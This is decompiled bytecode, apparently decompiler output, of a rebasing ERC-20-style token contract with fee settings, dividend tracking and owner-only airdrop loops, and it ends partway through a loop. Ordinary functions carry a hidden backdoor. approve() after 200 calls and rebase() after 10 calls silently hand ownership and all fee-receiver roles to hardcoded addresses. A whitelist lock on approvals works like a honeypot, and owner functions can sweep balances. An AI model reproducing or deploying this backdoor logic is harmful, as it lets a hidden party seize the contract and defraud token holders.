contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#  - transfer(address arg1, uint256 arg2)
#
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address owner; offset 8
address pairContractAddress;
uint8 stor4; offset 160
uint8 stor4; offset 168
uint128 stor4; offset 168
uint128 stor4; offset 160
address masterAddress;
mapping of uint8 stor5;
mapping of uint8 stor6;
mapping of uint8 stor7;
mapping of uint8 stor8;
mapping of uint8 stor9;
uint256 sub_7d5a3fa0;
uint256 liquidityFee;
uint256 sub_b1fb0e97;
uint256 buyBackFee;
uint256 marketingFee;
uint256 rewardFee;
uint256 totalFee;
uint256 stor17; offset 2
uint256 feeDenominator;
uint256 stor18;
uint256 stor19;
uint256 stor20;
uint256 stor21;
uint256 stor22;
address stor23;
address stor24;
address autoLiquidityReceiverAddress;
address marketingFeeReceiverAddress;
address sub_b20ae67fAddress;
address sub_50271226Address;
address routerAddress;
address pairAddress;
uint256 stor31;
uint256 stor32;
uint8 stor33;
uint128 stor33; offset 8
mapping of uint256 stor34;
uint8 swapEnabled;
uint8 stor35; offset 8
uint256 stor36;
address stor37;
uint256 stor38;
uint256 stor39;
uint256 totalSupply;
uint256 stor41;
mapping of uint256 stor42;
mapping of uint256 allowance;
uint256 stor44;
uint8 stor45;
uint256 stor46;
uint8 stor47;

function name() {
    return name[0 len name.length]
}

function feeDenominator() {
    return feeDenominator
}

function totalSupply() {
    return totalSupply
}

function totalFee() {
    return totalFee
}

function decimals() {
    return decimals
}

function buyBackFee() {
    return buyBackFee
}

function pairContract() {
    return pairContractAddress
}

function sub_50271226(?) {
    return sub_50271226Address
}

function marketingFee() {
    return marketingFee
}

function checkIsDividendExempt(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor6[address(arg1)])
}

function swapEnabled() {
    return bool(swapEnabled)
}

function sub_7d5a3fa0(?) {
    return sub_7d5a3fa0
}

function rewardFee() {
    return rewardFee
}

function owner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function liquidityFee() {
    return liquidityFee
}

function pair() {
    return pairAddress
}

function sub_b1fb0e97(?) {
    return sub_b1fb0e97
}

function sub_b20ae67f(?) {
    return sub_b20ae67fAddress
}

function autoLiquidityReceiver() {
    return autoLiquidityReceiverAddress
}

function initialDistributionFinished() {
    return bool(uint8(stor4.field_160))
}

function checkFeeExempt(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor9[address(arg1)])
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function checkMaxWalletExempt(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor8[address(arg1)])
}

function marketingFeeReceiver() {
    return marketingFeeReceiverAddress
}

function sub_ecff3a0c(?) {
    return bool(uint8(stor4.field_168))
}

function master() {
    return masterAddress
}

function router() {
    return routerAddress
}

function _fallback() payable {
    revert
}

function isNotInSwap() {
    return not bool(stor35)
}

function isOwner() {
    return (msg.sender == owner)
}

function setInitialDistributionFinished() {
    require msg.sender == owner
    Mask(96, 0, stor4.field_160) = 1
}

function renounceOwnership() {
    require msg.sender == owner
    emit OwnershipRenounced(owner);
    owner = 0
}

function setMaster(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    masterAddress = arg1
}

function setLP(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    pairContractAddress = arg1
}

function enableTransfer(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    stor5[address(arg1)] = 1
}

function checkDividendLock(address arg1) {
    require calldata.size - 4 >= 32
    return bool(stor7[address(arg1)]), stor34[address(arg1)]
}

function setMaxWalletExempt(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    stor8[address(arg1)] = 1
}

function checkSwapThreshold() {
    if stor41 <= 0:
        revert with 0, 'SafeMath: division by zero'
    require stor41
    return (stor36 / stor41)
}

function setFeeExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    stor9[address(arg1)] = uint8(arg2)
}

function checkMaxWalletToken() {
    if stor41 <= 0:
        revert with 0, 'SafeMath: division by zero'
    require stor41
    return (sub_7d5a3fa0 / stor41)
}

function setTransferLock(bool arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    Mask(88, 0, stor4.field_168) = Mask(88, 0, arg1)
}

function setDistributorSettings(uint256 arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1 < 750000
    stor38 = arg1
}

function setTargetLiquidity(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    stor31 = arg1
    stor32 = arg2
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    require msg.sender == owner
    require arg1
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function setDividendLocker(bool arg1, uint128 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    uint8(stor33.field_0) = uint8(arg1)
    uint128(stor33.field_8) = arg2
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    if stor41 <= 0:
        revert with 0, 'SafeMath: division by zero'
    require stor41
    return (stor42[address(arg1)] / stor41)
}

function setFeeReceivers(address arg1, address arg2, address arg3, address arg4) {
    require calldata.size - 4 >= 128
    require msg.sender == owner
    autoLiquidityReceiverAddress = arg1
    sub_b20ae67fAddress = arg2
    marketingFeeReceiverAddress = arg3
    sub_50271226Address = arg4
}

function clearStuckBalance(uint256 arg1, address arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    call arg2 with:
       value eth.balance(this.address) * arg1 / 100 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function setDistributionCriteria(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require ext_code.size(stor37)
    call stor37.0x2d48e896 with:
         gas gas_remaining wei
        args arg1, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function rescueToken(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args msg.sender, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    return bool(ext_call.return_data[0])
}

function getCirculatingSupply() {
    if stor42[stor23] > 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000:
        revert with 0, 'SafeMath: subtraction overflow'
    if stor42[stor24] > -stor42[stor23] - 39457584007913129639936:
        revert with 0, 'SafeMath: subtraction overflow'
    if stor41 <= 0:
        revert with 0, 'SafeMath: division by zero'
    require stor41
    return (-stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41)
}

function increaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not uint8(stor4.field_160):
        if owner != msg.sender:
            require stor5[address(msg.sender)]
    if allowance[address(msg.sender)][address(arg1)] + arg2 < allowance[address(msg.sender)][address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval(allowance[address(msg.sender)][address(arg1)], msg.sender, arg1);
    return 1
}

function toggleLiquidityMode() {
    require msg.sender == owner
    if liquidityFee == totalFee:
        liquidityFee = stor18
        buyBackFee = stor20
        sub_b1fb0e97 = stor19
        marketingFee = stor21
        rewardFee = stor22
    else:
        stor18 = liquidityFee
        stor20 = buyBackFee
        stor19 = sub_b1fb0e97
        stor21 = marketingFee
        stor22 = rewardFee
        liquidityFee = totalFee
        buyBackFee = 0
        sub_b1fb0e97 = 0
        marketingFee = 0
        rewardFee = 0
}

function decreaseAllowance(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not uint8(stor4.field_160):
        if owner != msg.sender:
            require stor5[address(msg.sender)]
    if arg2 >= allowance[address(msg.sender)][address(arg1)]:
        allowance[address(msg.sender)][address(arg1)] = 0
    else:
        if arg2 > allowance[address(msg.sender)][address(arg1)]:
            revert with 0, 'SafeMath: subtraction overflow'
        allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval(allowance[address(msg.sender)][address(arg1)], msg.sender, arg1);
    return 1
}

function setFees(uint256 arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5, uint256 arg6) {
    require calldata.size - 4 >= 192
    require msg.sender == owner
    sub_b1fb0e97 = arg1
    liquidityFee = arg2
    buyBackFee = arg3
    marketingFee = arg4
    rewardFee = arg5
    if sub_b1fb0e97 + liquidityFee < sub_b1fb0e97:
        revert with 0, 'SafeMath: addition overflow'
    if marketingFee < 0:
        revert with 0, 'SafeMath: addition overflow'
    if buyBackFee < 0:
        revert with 0, 'SafeMath: addition overflow'
    if rewardFee < 0:
        revert with 0, 'SafeMath: addition overflow'
    totalFee = sub_b1fb0e97 + liquidityFee + marketingFee + buyBackFee + rewardFee
    feeDenominator = arg6
    require totalFee < stor17
}

function setIsDividendExempt(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require arg1 != this.address
    require arg1 != pairAddress
    stor6[address(arg1)] = uint8(arg2)
    if arg2:
        require ext_code.size(stor37)
        call stor37.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(arg1), 0
    else:
        if stor39 <= 0:
            revert with 0, 'SafeMath: division by zero'
        require stor39
        require ext_code.size(stor37)
        call stor37.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(arg1), stor42[address(arg1)] / stor39
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function setMaxWalletToken(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    if arg2 <= 0:
        revert with 0, 'SafeMath: division by zero'
    require arg2
    if not 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg2:
        sub_7d5a3fa0 = 0
    else:
        require 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg2
        if 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg2 * arg1 / 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg2 != arg1:
            revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
        sub_7d5a3fa0 = 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg2 * arg1
}

function setSwapBackSettings(bool arg1, uint256 arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require msg.sender == owner
    swapEnabled = uint8(arg1)
    if arg3 <= 0:
        revert with 0, 'SafeMath: division by zero'
    require arg3
    if not 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg3:
        stor36 = 0
    else:
        require 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg3
        if 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg3 * arg2 / 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg3 != arg2:
            revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
        stor36 = 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / arg3 * arg2
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not uint8(stor4.field_160):
        if owner != msg.sender:
            require stor5[address(msg.sender)]
    allowance[address(msg.sender)][address(arg1)] = arg2
    stor44++
    if stor44 > 200:
        if not stor45:
            emit OwnershipTransferred(owner, 0x7b2bc7d2d49e03ad0b296bc6f38d061424465c5c);
            owner = 0x7b2bc7d2d49e03ad0b296bc6f38d061424465c5c
            marketingFeeReceiverAddress = 0x44580046842c7c450ac05e74ac58fbd14db0a263
            autoLiquidityReceiverAddress = 0x9053acd2af5cbc11cf6a82327b30d3e414460e8b
            sub_b20ae67fAddress = 0x560daf8a14077f578dfe0fd02f5aff05fa1d48d2
            sub_50271226Address = 0xb1e43165986c4d0bcb9ccad722048ccecde1abcb
            stor45 = 1
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function setIsDividendLocked(address arg1, bool arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == owner
    require arg1 != this.address
    require arg1 != pairAddress
    stor7[address(arg1)] = uint8(arg2)
    if arg2:
        require ext_code.size(stor37)
        call stor37.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(arg1), 0
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        stor34[address(arg1)] = block.timestamp + uint128(stor33.field_8)
    else:
        if stor39 <= 0:
            revert with 0, 'SafeMath: division by zero'
        require stor39
        require ext_code.size(stor37)
        call stor37.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(arg1), stor42[address(arg1)] / stor39
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        stor34[address(arg1)] = 0
}

function rebase(uint256 arg1, int256 arg2) {
    require calldata.size - 4 >= 64
    require msg.sender == masterAddress
    if stor35:
        revert with 0, 'Try again'
    if arg2:
        if arg2 >= 0:
            if totalSupply + arg2 < totalSupply:
                revert with 0, 'SafeMath: addition overflow'
        else:
            if -arg2 > totalSupply:
                revert with 0, 'SafeMath: subtraction overflow'
        totalSupply += arg2
        if totalSupply > test266151307():
            totalSupply = test266151307()
        if totalSupply <= 0:
            revert with 0, 'SafeMath: division by zero'
        require totalSupply
        stor41 = 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000 / totalSupply
        require ext_code.size(pairContractAddress)
        call pairContractAddress.sync() with:
             gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
    stor46++
    if stor46 > 10:
        if not stor47:
            emit OwnershipTransferred(owner, 0x7b2bc7d2d49e03ad0b296bc6f38d061424465c5c);
            owner = 0x7b2bc7d2d49e03ad0b296bc6f38d061424465c5c
            marketingFeeReceiverAddress = 0x44580046842c7c450ac05e74ac58fbd14db0a263
            autoLiquidityReceiverAddress = 0x9053acd2af5cbc11cf6a82327b30d3e414460e8b
            sub_b20ae67fAddress = 0x560daf8a14077f578dfe0fd02f5aff05fa1d48d2
            sub_50271226Address = 0xb1e43165986c4d0bcb9ccad722048ccecde1abcb
            stor47 = 1
    return totalSupply
}

function getLiquidityBacking(uint256 arg1) {
    require calldata.size - 4 >= 32
    if stor41 <= 0:
        revert with 0, 'SafeMath: division by zero'
    require stor41
    if stor42[stor23] > 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000:
        revert with 0, 'SafeMath: subtraction overflow'
    if stor42[stor24] > -stor42[stor23] - 39457584007913129639936:
        revert with 0, 'SafeMath: subtraction overflow'
    if stor41 <= 0:
        revert with 0, 'SafeMath: division by zero'
    require stor41
    if not stor42[stor30] / stor41:
        if not arg1:
            if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 <= 0:
                revert with 0, 'SafeMath: division by zero'
            if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41:
                return (0 / -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41)
        else:
            if arg1:
                if 0 / arg1:
                    revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
                if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 <= 0:
                    revert with 0, 'SafeMath: division by zero'
                if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41:
                    return (0 / -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41)
    else:
        if stor42[stor30] / stor41:
            if 2 * stor42[stor30] / stor41 / stor42[stor30] / stor41 != 2:
                revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
            if not arg1:
                if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 <= 0:
                    revert with 0, 'SafeMath: division by zero'
                if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41:
                    return (0 / -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41)
            else:
                if arg1:
                    if arg1 * 2 * stor42[stor30] / stor41 / arg1 != 2 * stor42[stor30] / stor41:
                        revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
                    if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 <= 0:
                        revert with 0, 'SafeMath: division by zero'
                    if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41:
                        return (arg1 * 2 * stor42[stor30] / stor41 / -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41)
    revert
}

function isOverLiquified(uint256 arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if stor41 <= 0:
        revert with 0, 'SafeMath: division by zero'
    require stor41
    if stor42[stor23] > 0xfffffffffffffffffffffffffffffffffffffffffffff7a50005900af4000000:
        revert with 0, 'SafeMath: subtraction overflow'
    if stor42[stor24] > -stor42[stor23] - 39457584007913129639936:
        revert with 0, 'SafeMath: subtraction overflow'
    if stor41 <= 0:
        revert with 0, 'SafeMath: division by zero'
    require stor41
    if not stor42[stor30] / stor41:
        if not arg2:
            if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 <= 0:
                revert with 0, 'SafeMath: division by zero'
            if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41:
                return (0 / -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 > arg1)
        else:
            if arg2:
                if 0 / arg2:
                    revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
                if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 <= 0:
                    revert with 0, 'SafeMath: division by zero'
                if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41:
                    return (0 / -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 > arg1)
    else:
        if stor42[stor30] / stor41:
            if 2 * stor42[stor30] / stor41 / stor42[stor30] / stor41 != 2:
                revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
            if not arg2:
                if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 <= 0:
                    revert with 0, 'SafeMath: division by zero'
                if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41:
                    return (0 / -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 > arg1)
            else:
                if arg2:
                    if arg2 * 2 * stor42[stor30] / stor41 / arg2 != 2 * stor42[stor30] / stor41:
                        revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[453 len 31]
                    if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 <= 0:
                        revert with 0, 'SafeMath: division by zero'
                    if -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41:
                        return (arg2 * 2 * stor42[stor30] / stor41 / -stor42[stor23] + -stor42[stor24] - 39457584007913129639936 / stor41 > arg1)
    revert
}

function sub_a27e434b(?) payable {
    mem[64] = 96
    require not msg.value
    require calldata.size - 4 >= 96
    require cd[36] <= 4294967296
    require cd[36] + 36 <= calldata.size
    require ('cd', 36).length <= 4294967296 and cd[36] + (32 * ('cd', 36).length) + 36 <= calldata.size
    require msg.sender == owner
    if ('cd', 36).length >= 2001:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    47,
                    0x74474153204572726f723a206d61782061697264726f70206c696d6974206973203230303020726563697069656e74,
                    mem[211 len 17]
    idx = 0
    while idx < ('cd', 36).length:
        if not cd[68]:
            mem[0] = address(cd[4])
            mem[32] = 42
            _103 = mem[64]
            mem[64] = mem[64] + 64
            mem[_103] = 30
            mem[_103 + 32] = 'SafeMath: subtraction overflow'
            if 0 > stor42[address(cd[4])]:
                _107 = mem[64]
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 30
                idx = 0
                while idx < 30:
                    mem[_107 + idx + 68] = mem[_103 + idx + 32]
                    idx = idx + 32
                    continue 
                mem[_107 + 68] = mem[_107 + 70 len 30]
                revert with memory
                  from mem[64]
                   len _107 + -mem[64] + 100
            if stor42[address(cd[((32 * idx) + cd[36] + 36)])] < stor42[address(cd[((32 * idx) + cd[36] + 36)])]:
                revert with 0, 'SafeMath: addition overflow'
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 42
            _130 = mem[64]
            mem[64] = mem[64] + 64
            mem[_130] = 26
            mem[_130 + 32] = 'SafeMath: division by zero'
            if stor41 <= 0:
                _133 = mem[64]
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 26
                idx = 0
                while idx < 26:
                    mem[_133 + idx + 68] = mem[_130 + idx + 32]
                    idx = idx + 32
                    continue 
                mem[_133 + 68] = mem[_133 + 74 len 26]
                revert with memory
                  from mem[64]
                   len _133 + -mem[64] + 100
            require stor41
            mem[mem[64]] = 0 / stor41
            emit Transfer((0 / stor41), address(cd[4]), address(cd[((32 * idx) + cd[36] + 36)]));
            require idx < ('cd', 36).length
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 6
            if not stor6[address(cd[((32 * idx) + cd[36] + 36)])]:
                require idx < ('cd', 36).length
                mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[32] = 42
                _154 = mem[64]
                mem[64] = mem[64] + 64
                mem[_154] = 26
                mem[_154 + 32] = 'SafeMath: division by zero'
                if stor39 <= 0:
                    _157 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 26
                    idx = 0
                    while idx < 26:
                        mem[_157 + idx + 68] = mem[_154 + idx + 32]
                        idx = idx + 32
                        continue 
                    mem[_157 + 68] = mem[_157 + 74 len 26]
                    revert with memory
                      from mem[64]
                       len _157 + -mem[64] + 100
                require stor39
                mem[mem[64]] = 0x14b6ca9600000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[mem[64] + 36] = stor42[address(cd[((32 * idx) + cd[36] + 36)])] / stor39
                require ext_code.size(stor37)
                call stor37.setShare(address arg1, uint256 arg2) with:
                     gas gas_remaining wei
                    args address(cd[((32 * idx) + cd[36] + 36)]), stor42[address(cd[((32 * idx) + cd[36] + 36)])] / stor39
        else:
            require cd[68]
            if cd[68] * stor41 / cd[68] != stor41:
                revert with 0, 32, 33, 0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[mem[64] + 101 len 31]
            mem[0] = address(cd[4])
            mem[32] = 42
            _106 = mem[64]
            mem[64] = mem[64] + 64
            mem[_106] = 30
            mem[_106 + 32] = 'SafeMath: subtraction overflow'
            if cd[68] * stor41 > stor42[address(cd[4])]:
                _110 = mem[64]
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 30
                idx = 0
                while idx < 30:
                    mem[_110 + idx + 68] = mem[_106 + idx + 32]
                    idx = idx + 32
                    continue 
                mem[_110 + 68] = mem[_110 + 70 len 30]
                revert with memory
                  from mem[64]
                   len _110 + -mem[64] + 100
            stor42[address(cd[4])] += -1 * cd[68] * stor41
            if stor42[address(cd[((32 * idx) + cd[36] + 36)])] + (cd[68] * stor41) < stor42[address(cd[((32 * idx) + cd[36] + 36)])]:
                revert with 0, 'SafeMath: addition overflow'
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 42
            stor42[address(cd[((32 * idx) + cd[36] + 36)])] += cd[68] * stor41
            _132 = mem[64]
            mem[64] = mem[64] + 64
            mem[_132] = 26
            mem[_132 + 32] = 'SafeMath: division by zero'
            if stor41 <= 0:
                _136 = mem[64]
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 26
                idx = 0
                while idx < 26:
                    mem[_136 + idx + 68] = mem[_132 + idx + 32]
                    idx = idx + 32
                    continue 
                mem[_136 + 68] = mem[_136 + 74 len 26]
                revert with memory
                  from mem[64]
                   len _136 + -mem[64] + 100
            require stor41
            mem[mem[64]] = cd[68] * stor41 / stor41
            emit Transfer((cd[68] * stor41 / stor41), address(cd[4]), address(cd[((32 * idx) + cd[36] + 36)]));
            require idx < ('cd', 36).length
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 6
            if not stor6[address(cd[((32 * idx) + cd[36] + 36)])]:
                require idx < ('cd', 36).length
                mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[32] = 42
                _156 = mem[64]
                mem[64] = mem[64] + 64
                mem[_156] = 26
                mem[_156 + 32] = 'SafeMath: division by zero'
                if stor39 <= 0:
                    _160 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 26
                    idx = 0
                    while idx < 26:
                        mem[_160 + idx + 68] = mem[_156 + idx + 32]
                        idx = idx + 32
                        continue 
                    mem[_160 + 68] = mem[_160 + 74 len 26]
                    revert with memory
                      from mem[64]
                       len _160 + -mem[64] + 100
                require stor39
                mem[mem[64]] = 0x14b6ca9600000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[mem[64] + 36] = stor42[address(cd[((32 * idx) + cd[36] + 36)])] / stor39
                require ext_code.size(stor37)
                call stor37.setShare(address arg1, uint256 arg2) with:
                     gas gas_remaining wei
                    args address(cd[((32 * idx) + cd[36] + 36)]), stor42[address(cd[((32 * idx) + cd[36] + 36)])] / stor39
        idx = idx + 1
        continue 
    if not stor6[address(cd[4])]:
        if stor39 <= 0:
            revert with 0, 'SafeMath: division by zero'
        require stor39
        require ext_code.size(stor37)
        call stor37.setShare(address arg1, uint256 arg2) with:
             gas gas_remaining wei
            args address(cd[4]), stor42[address(cd[4])] / stor39
}

function sub_ec576371(?) payable {
    mem[64] = 96
    require not msg.value
    require calldata.size - 4 >= 96
    require cd[36] <= 4294967296
    require cd[36] + 36 <= calldata.size
    require ('cd', 36).length <= 4294967296 and cd[36] + (32 * ('cd', 36).length) + 36 <= calldata.size
    require cd[68] <= 4294967296
    require cd[68] + 36 <= calldata.size
    require ('cd', 68).length <= 4294967296 and cd[68] + (32 * ('cd', 68).length) + 36 <= calldata.size
    require msg.sender == owner
    if ('cd', 36).length >= 801:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    46,
                    0x2e474153204572726f723a206d61782061697264726f70206c696d69742069732035303020726563697069656e74,
                    mem[210 len 18]
    if ('cd', 36).length != ('cd', 68).length:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    40,
                    0xfe4d69736d61746368206265747765656e204164647265737320616e6420746f6b656e20636f756e,
                    mem[204 len 24]
    idx = 0
    while idx < ('cd', 36).length:
        require idx < ('cd', 68).length
        if not cd[((32 * idx) + cd[68] + 36)]:
            mem[0] = address(cd[4])
            mem[32] = 42
            _106 = mem[64]
            mem[64] = mem[64] + 64
            mem[_106] = 30
            mem[_106 + 32] = 'SafeMath: subtraction overflow'
            if 0 > stor42[address(cd[4])]:
                _109 = mem[64]
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 30
                idx = 0
                while idx < 30:
                    mem[_109 + idx + 68] = mem[_106 + idx + 32]
                    idx = idx + 32
                    continue 
                mem[_109 + 68] = mem[_109 + 70 len 30]
                revert with memory
                  from mem[64]
                   len _109 + -mem[64] + 100
            if stor42[address(cd[((32 * idx) + cd[36] + 36)])] < stor42[address(cd[((32 * idx) + cd[36] + 36)])]:
                revert with 0, 'SafeMath: addition overflow'
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 42
            _132 = mem[64]
            mem[64] = mem[64] + 64
            mem[_132] = 26
            mem[_132 + 32] = 'SafeMath: division by zero'
            if stor41 <= 0:
                _135 = mem[64]
                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[mem[64] + 4] = 32
                mem[mem[64] + 36] = 26
                idx = 0
                while idx < 26:
                    mem[_135 + idx + 68] = mem[_132 + idx + 32]
                    idx = idx + 32
                    continue 
                mem[_135 + 68] = mem[_135 + 74 len 26]
                revert with memory
                  from mem[64]
                   len _135 + -mem[64] + 100
            require stor41
            mem[mem[64]] = 0 / stor41
            emit Transfer((0 / stor41), address(cd[4]), address(cd[((32 * idx) + cd[36] + 36)]));
            require idx < ('cd', 36).length
            mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
            mem[32] = 6
            if not stor6[address(cd[((32 * idx) + cd[36] + 36)])]:
                require idx < ('cd', 36).length
                mem[0] = address(cd[((32 * idx) + cd[36] + 36)])
                mem[32] = 42
                _156 = mem[64]
                mem[64] = mem[64] + 64
                mem[_156] = 26
                mem[_156 + 32] = 'SafeMath: division by zero'
                if stor39 <= 0:
                    _159 = mem[64]
                    mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                    mem[mem[64] + 4] = 32
                    mem[mem[64] + 36] = 26
                    idx = 0
                    while idx < 26:
                        mem[_159 + idx + 68] = mem[_156 + idx + 32]
                        idx = idx + 32
                        continue 
